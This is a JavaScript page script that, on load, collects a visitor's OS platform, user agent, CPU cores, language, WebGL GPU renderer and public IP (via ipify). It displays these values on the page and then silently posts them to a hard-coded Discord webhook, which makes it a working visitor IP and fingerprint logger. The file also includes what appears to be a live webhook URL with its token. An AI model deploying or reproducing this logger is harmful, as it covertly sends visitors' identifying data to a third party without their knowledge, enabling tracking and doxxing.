// Function to get and display basic system info
async function getSystemInfo() {
    const os = navigator.platform;
    const browser = navigator.userAgent;
    const architecture = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + '-core' : 'N/A';
    const language = navigator.language;

    // Get GPU using WebGL
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    let gpuInfo = 'Unavailable';
    if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
            gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        }
    }

    // Get public IP using an external service (ipify)
    let ipAddress = 'Unknown';
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        ipAddress = data.ip;
    } catch (error) {
        console.error('Error getting IP:', error);
    }

    // Populate the HTML with system info
    document.getElementById('os').querySelector('.highlight').textContent = os;
    document.getElementById('browser').querySelector('.highlight').textContent = browser;
    document.getElementById('arch').querySelector('.highlight').textContent = architecture;
    document.getElementById('cores').querySelector('.highlight').textContent = navigator.hardwareConcurrency || 'N/A';
    document.getElementById('language').querySelector('.highlight').textContent = language;
    document.getElementById('gpu').querySelector('.highlight').textContent = gpuInfo;
    document.getElementById('ip').querySelector('.highlight').textContent = ipAddress;

    // Remove the spinner and update the footer text
    document.getElementById('spinner').style.display = 'none';
    document.getElementById('footer').textContent = 'System information collected successfully!';

    // Send this data to a Discord webhook
    const systemData = {
        os: os,
        browser: browser,
        architecture: architecture,
        cores: navigator.hardwareConcurrency || 'N/A',
        language: language,
        gpu: gpuInfo,
        ip: ipAddress
    };

    // Prepare the message for Discord
    const discordMessage = {
        content: `**System Information:**
- OS: ${systemData.os}
- Browser: ${systemData.browser}
- Architecture: ${systemData.architecture}
- CPU Cores: ${systemData.cores}
- Language: ${systemData.language}
- GPU: ${systemData.gpu}
- IP Address: ${systemData.ip}`
    };

    // Replace this with your actual Discord webhook URL
    const discordWebhookURL = 'https://discord.com/api/webhooks/1288017344433618994/qOJ8uTxbOUFSxvx1Agwa9zaPJ58eqEXuSTPCM2M2crGVelafYk5Oqx8KZq8Lhs4w_x-t';

    fetch(discordWebhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(discordMessage),
    })
    .then(response => {
        if (response.ok) {
            console.log('Message sent to Discord webhook');
        } else {
            console.error('Error sending message to Discord:', response.statusText);
        }
    })
    .catch((error) => {
        console.error('Error sending data to Discord webhook:', error);
    });
}

// Run the function when the page loads
window.onload = getSystemInfo;
